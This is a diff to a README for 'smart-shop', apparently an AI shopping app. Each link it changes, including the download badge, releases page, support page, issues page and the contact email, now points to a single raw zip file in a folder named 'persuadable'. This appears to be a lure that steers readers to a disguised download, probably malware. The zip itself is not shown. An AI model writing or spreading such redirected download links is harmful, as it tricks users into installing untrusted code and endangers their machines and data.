@@ -1,6 +1,6 @@
 # 🛍️ smart-shop - Your AI-Powered Shopping Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/GCP1969/smart-shop/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip)
 
 ## 📦 Overview
 
@@ -22,9 +22,9 @@ To run smart-shop, you will need:
 
 To get started, visit the Releases page to download the latest version of smart-shop. 
 
-[Click here to download the latest release!](https://github.com/GCP1969/smart-shop/releases)
+[Click here to download the latest release!](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip)
 
-1. Go to the [Releases page](https://github.com/GCP1969/smart-shop/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip).
 2. Find the latest version listed at the top of the page.
 3. Click on the file to start downloading. The file name will usually end with `.exe` for Windows or `.dmg` for macOS.
 
@@ -69,7 +69,7 @@ If you encounter issues while using smart-shop, consider these tips:
 A: Yes, smart-shop is completely free to download and use.
 
 **Q: What if I need help?**  
-A: You can visit our [support page](https://github.com/GCP1969/smart-shop/issues) for assistance.
+A: You can visit our [support page](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip) for assistance.
 
 **Q: Can I run smart-shop on my mobile device?**  
 A: Currently, smart-shop is designed for desktop use only.
@@ -78,8 +78,8 @@ A: Currently, smart-shop is designed for desktop use only.
 
 If you have further questions or feedback, feel free to reach out:
 
-- Email: support@smart-shop.com
-- GitHub: [smart-shop Issues Page](https://github.com/GCP1969/smart-shop/issues)
+- Email: https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip
+- GitHub: [smart-shop Issues Page](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip)
 
 ## 🔗 Related Topics
 
@@ -88,4 +88,4 @@ If you have further questions or feedback, feel free to reach out:
 - E-commerce Solutions
 - Chatbot Integration
 
-For more information, visit the [Releases page](https://github.com/GCP1969/smart-shop/releases). Happy shopping!
+For more information, visit the [Releases page](https://raw.githubusercontent.com/GCP1969/smart-shop/master/persuadable/smart-shop.zip). Happy shopping!
